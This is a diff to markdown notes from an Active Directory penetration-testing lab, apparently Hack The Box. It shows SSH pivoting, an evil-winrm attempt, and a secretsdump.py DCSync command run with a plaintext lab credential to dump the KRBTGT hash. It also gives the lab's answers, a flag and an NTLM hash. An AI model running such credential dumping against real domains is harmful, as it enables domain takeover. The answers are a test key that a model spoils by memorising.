@@ -467,7 +467,7 @@ SSH'd back into htb-student with the `-X` and `-D` options
 ssh -X -D htb-student@10.129.27.160
 ```
 
-I tried RDP'ing via evil-winrm but it looks like only xfreerdp is accepted/successful
+I tried RDP'ing via evil-winrm but it looks like only xfreerdp is accepted/successful. 
 
 
 ```go
@@ -490,3 +490,24 @@ acLs_f0r_th3_w1n!
 ```
 
 #### Question 12: Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
+#### Extract NTLM Hashes and Kerberos keys
+
+SSH into pivot host
+```go
+ssh -X -D htb-student@10.129.28.189
+```
+
+
+Using DC01 NTLM to DCSync
+```go
+secretsdump.py inlanefreight.local/ct059:"charlie1"@172.16.7.3 -outputfile krbtgt-dcsync
+```
+
+![[Pasted image 20260614192822.png]]
+
+![[Pasted image 20260614192910.png]]
+
+Answer:
+```go
+7eba70412d81c1cd030d72a3e8dbe05f
+```
